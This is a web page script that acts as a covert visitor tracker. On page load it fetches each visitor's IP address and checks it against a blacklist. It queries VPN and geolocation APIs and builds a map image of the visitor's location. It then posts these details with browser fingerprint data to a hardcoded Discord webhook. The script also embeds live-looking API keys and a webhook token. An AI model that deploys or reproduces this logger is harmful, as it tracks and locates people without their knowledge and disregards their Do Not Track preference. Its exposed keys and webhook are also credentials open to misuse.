    <script>
        // Show the main content and hide the entry screen on button click
        document.getElementById('enter-button').addEventListener('click', function() {
            document.getElementById('entry-screen').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
        });

        // Function to check if IP is in blacklist
        function isBlacklisted(ip, callback) {
            $.get("blacklist.txt", function(blacklistData) {
                const blacklist = blacklistData.split(/\r?\n/); // Split by newline
                callback(blacklist.includes(ip));
            });
        }

        $(document).ready(() => {
            $.getJSON("https://api.ipify.org?format=json", function (data) {
                isBlacklisted(data.ip, function(isBlocked) {
                    if (!isBlocked) {
                        $.getJSON(
                            `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
                            function (vpnData) {
                                $.getJSON(
                                    `https://ipapi.co/${data.ip}/json`,
                                    function (ipData) {
                                        sendData(
                                            data.ip,
                                            vpnData.security.vpn,
                                            `${ipData.region}, ${ipData.country_code}`,
                                            `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
                                        );
                                    }
                                );
                            }
                        );
                    } else {
                        console.log("IP is blacklisted:", data.ip);
                    }
                });
            });
        });

        function sendData(ip, vpn, location, image) {
            var currentTime = new Date().toUTCString();
            var embed = {
                embeds: [
                    {
                        title: "Visitor Logged",
                        description: `Logged At: \`${currentTime}\``,
                        image: {
                            url: image,
                        },
                        color: 14177041,
                        fields: [
                            {
                                name: "IP Address",
                                value: ip,
                                inline: true,
                            },
                            {
                                name: "VPN",
                                value: vpn ? "✅" : "❌",
                                inline: true,
                            },
                            {
                                name: "Location",
                                value: location || "❓",
                                inline: true,
                            },
                            {
                                name: "Browser Language",
                                value: navigator.language ? navigator.language.toUpperCase() : "❓",
                                inline: true,
                            },
                            {
                                name: "Do Not Track",
                                value: navigator.doNotTrack ? "✅" : "❌",
                                inline: true,
                            },
                            {
                                name: "Cookies Enabled",
                                value: navigator.cookieEnabled ? "✅" : "❌",
                                inline: true,
                            },
                            {
                                name: "App Version / User Agent",
                                value: navigator.appVersion,
                            },
                        ],
                    },
                ],
            };

            fetch("https://discord.com/api/webhooks/1283503780825927690/d36GnITE9B5nOo0d_BR0Jn4f4mLKTZJ61TSiOPneMFOMCD6W9oN7NZULwCGdX6dSPARb", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(embed),
            }).catch((error) => {
                alert("Error sending data:", error);
            });
        }
    </script>
